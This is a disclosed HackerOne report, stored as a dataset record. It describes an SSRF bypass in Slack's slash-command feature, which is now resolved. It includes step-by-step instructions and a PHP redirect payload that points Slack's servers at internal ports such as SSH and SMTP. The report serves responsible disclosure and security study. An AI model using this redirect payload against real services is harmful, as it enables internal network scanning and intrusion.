---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '381129'
original_report_id: '381129'
title: SSRF in api.slack.com, using slash commands and bypassing the protections.
weakness: Server-Side Request Forgery (SSRF)
team_handle: slack
created_at: '2018-07-13T03:38:51.937Z'
disclosed_at: '2019-02-22T20:58:21.565Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 78
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# SSRF in api.slack.com, using slash commands and bypassing the protections.

## Metadata

- HackerOne Report ID: 381129
- Weakness: Server-Side Request Forgery (SSRF)
- Program: slack
- Disclosed At: 2019-02-22T20:58:21.565Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Bypassing the reports #61312 and #356765

**Tutorial:**


**Go to api.slack.com and create an application with your own slash command.**
{F320014}

**Enter your own domain:**
*in your own domain: index.php*

`<?php
header("location: http://[::]:22/");
?> `

location: http://[::]:22/

{F320019}

And save.

Go to your Slack and type /youslash


Try with my server http://206.189.204.187/


Results:

SSH
{F320015}

SMNTP
{F320016}

## Impact

In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources, and scan for internal ports and get the versions of the services running on the server.
 
Referer: https://www.owasp.org/index.php/Server_Side_Request_Forgery
https://hackerone.com/reports/61312

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
